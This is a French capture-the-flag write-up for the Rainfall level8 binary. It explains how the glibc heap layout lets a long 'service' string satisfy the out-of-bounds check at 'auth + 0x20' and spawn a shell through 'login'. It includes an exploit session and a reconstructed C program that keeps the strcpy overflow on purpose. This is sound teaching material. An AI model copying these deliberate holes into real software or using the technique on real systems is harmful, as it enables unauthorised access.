# Exploit “heap trick” — `auth + 0x20` (Rainfall level8)

Ce README explique clairement **pourquoi** et **comment** l’exercice `level8` se bypass avec la commande `login` grâce à la mise en page du **tas (heap)** et au test **out-of-bounds** `*(int *)(auth + 0x20)`.

---

## TL;DR

- Le programme lit un **int** (4 octets) à l’adresse **`auth + 0x20`**.
- Sur glibc i386, `malloc(4)` donne un **chunk de 0x10 octets** (16).
- L’allocation de `service` vient **après** celle d’`auth`, à **`auth + 0x10`** (souvent).
- Donc `auth + 0x20` tombe **dans la zone utilisateur de `service`**, à l’offset **`+0x10`**.
- Si tu mets **≥ 20 caractères** dans `service`, les octets `service[16..19]` **≠ 0** → `login` lance `system("/bin/sh")`.

---

## Contexte (simplifié)

Le programme boucle et accepte des commandes :

- `auth <name>` : `auth = malloc(4)` puis `strcpy(auth, name)` si `strlen(name) < 31` (**overflow possible**).
- `service <text>` : `service = strdup(text)`.
- `login` :
  ```c
  if (*(int *)(auth + 0x20) == 0) {
    fwrite("Password:\n",1,10,stdout);
  } else {
    system("/bin/sh");
  }
  ```

---

## Modèle de chunk glibc (i386)

Un chunk `malloc` ressemble à ceci (32‑bits) :

```
[ prev_size (4) ][  size (4)  ][    user data ...     ]
^ adresse chunk                  ^ pointeur retourné par malloc()
```

- **En‑tête = 8 octets** (prev_size + size).
- **Alignement par 8 octets**.
- **Taille minimale** d’un chunk = **0x10** (16).  
  Donc `malloc(4)` → chunk total 0x10 (8 d’en‑tête + 8 utilisables).

---

## Schéma mémoire (adresses croissantes)

Supposons que le programme affiche :

```
auth    = A
service = S    (souvent S = A + 0x10)
```

Mémoire (cas courant `S = A + 0x10`) :

```
A - 0x08: [ prev_size ]    (4)   <-- en-tête du chunk 'auth'
A - 0x04: [   size   ]     (4)
A      : [ user auth ]          <-- auth pointe ici (malloc(4))
A + ...: [ padding   ]          (jusqu'à 0x10 au total)

S - 0x08: [ prev_size ]    (4)   <-- en-tête du chunk 'service'
S - 0x04: [   size   ]     (4)
S      : [ service[0] ]
S + 0x01: [ service[1] ]
...
S + 0x0F: [ service[15] ]
S + 0x10: [ service[16] ]  <-- lu par *(int *)(auth + 0x20)
S + 0x11: [ service[17] ]
S + 0x12: [ service[18] ]
S + 0x13: [ service[19] ]
S + 0x14: [ '\0' ]         (terminateur C)
```

Calcul clé :

```
auth + 0x20 = A + 0x20
service + 0x10 = S + 0x10

Si S = A + 0x10  =>  auth + 0x20 = service + 0x10
```

👉 Le test `*(int*)(auth+0x20)` lit **les 4 octets `service[16..19]`**.

---

## Condition pour déclencher le shell

Pour que `*(int*)(auth+0x20) != 0`, il faut que **au moins un des 4 octets** lus soit **non nul**.

Dans le cas `service = auth + 0x10` :

- Il faut remplir `service[0..19]` → **au moins 20 caractères**.
- Exemple : `service BBBBBBBBBBBBBBBBBBBBBB` (20 × `B`), alors `service[16..19] = 0x42` → non nul → `system("/bin/sh")`.

---

> Exemple de ton run : `S = A + 0x10` → `offset = 0x10` → `min_len = 0x14` (20).

---

## Procédure d’exploitation

### Interactif

```
$ ./level8
(nil), (nil)
auth a
0x804a008, (nil)
service BBBBBBBBBBBBBBBBBBBBBB
0x804a008, 0x804a018
login
# => shell via system("/bin/sh")
```

*(Adapte le nombre de `B` selon la formule si `service` ≠ `auth + 0x10`.)*


---

## Version simplifiée du `main` (équivalente, lisible)

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char *auth   = NULL;
char *service = NULL;

static void chomp(char *s) {
    if (!s) return;
    size_t n = strcspn(s, "\r\n");
    s[n] = '\0';
}

int main(void) {
    char line[0x80];

    for (;;) {
        printf("%p, %p \\n", auth, service);

        if (!fgets(line, sizeof line, stdin))
            return 0;

        if (strncmp(line, "auth ", 5) == 0) {
            char *name = line + 5;
            chomp(name);
            auth = (char *)malloc(4);
            if (!auth) exit(1);
            memset(auth, 0, 4);
            if (strlen(name) < 31) {
                strcpy(auth, name); // vulnérable
            }
            continue;
        }

        if (strncmp(line, "reset", 5) == 0) {
            free(auth);
            auth = NULL;
            continue;
        }

        if (strncmp(line, "service", 7) == 0) {
            char *rest = line + 7;
            chomp(rest);
            free(service);
            service = strdup(rest);
            continue;
        }

        if (strncmp(line, "login", 5) == 0) {
            if (*(int *)(auth + 0x20) == 0) {
                fwrite("Password:\\n", 1, 10, stdout);
            } else {
                system("/bin/sh");
            }
            continue;
        }
    }
}
```

*(Cette version conserve volontairement les vulnérabilités pour rester fidèle à l’exo.)*

---
